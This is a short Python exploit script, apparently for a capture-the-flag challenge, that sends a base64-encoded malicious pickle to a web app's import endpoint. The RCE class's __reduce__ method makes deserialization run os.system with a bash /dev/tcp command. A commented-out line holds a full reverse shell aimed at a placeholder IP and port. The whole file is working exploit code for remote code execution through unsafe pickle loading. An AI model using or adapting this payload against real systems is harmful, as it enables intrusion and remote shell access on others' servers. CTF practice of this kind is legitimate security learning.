import pickle
import requests
import base64
import os


def normal_post_request(debug=True):
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}

    ]
    print("typeof mylayout:", type(my_layout))
    my_layout = pickle.dumps(my_layout)
    my_layout = base64.b64encode(my_layout)
    my_layout = str(my_layout, 'utf-8')
    print(my_layout)
   
    if debug:
        return
    myobj = {'layout': my_layout}
    url = 'http://ctf.adl.tw:12004/api/import'
    r = requests.post(url, json=myobj)

    return


class RCE:
    def __reduce__(self):
        ip="0.0.0.0"
        port="4444"
        #cmd=("bash -c \"bash &>/dev/tcp/%s/%s <&1\""%(ip,port))
        cmd=("bash -c \"echo \"test\">/dev/tcp/%s/%s\""%(ip,port))


        return os.system, (cmd,)
        

def payload():


    my_layout = [{'id': 'hako01', 'left': 1131, 'top': RCE()}]
    my_layout=base64.b64encode(pickle.dumps(my_layout)).decode()
    print(my_layout)

    myobj = {'layout': my_layout}
    url = 'http://ctf.adl.tw:12004/api/import'
    r = requests.post(url, json=myobj)

    return


payload()


